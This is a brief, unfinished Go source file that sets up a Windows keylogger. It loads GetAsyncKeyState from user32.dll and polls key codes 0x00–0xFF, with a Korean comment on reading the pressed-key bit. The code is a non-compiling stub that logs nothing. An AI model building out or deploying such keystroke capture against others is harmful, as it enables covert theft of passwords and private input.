package keyboard

import (
	"golang.org/x/sys/windows"
	"io"
)

// keycode iota

// events channel
// time: Key, UpDown

// GetAsyncKeyState
// most significant bit 가 set이면 해당 키 눌린 거
//

var (
	user32DLL            = windows.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32DLL.NewProc("GetAsyncKeyState")
)

func GetKey() {
	procGetAsyncKeyState.Call()
}

// KeyLog takes a readWriter and writes the logged characters.
func KeyLog(rw io.ReadWriter) (err error) {
	// Query key mapped to integer `0x00` to `0xFF` if it's pressed.
	for i := 0; i < 0xFF; i++ {
		ks, _, _ := procGetAsyncKeyState.Call(uintptr(i))
	}
	return nil
}
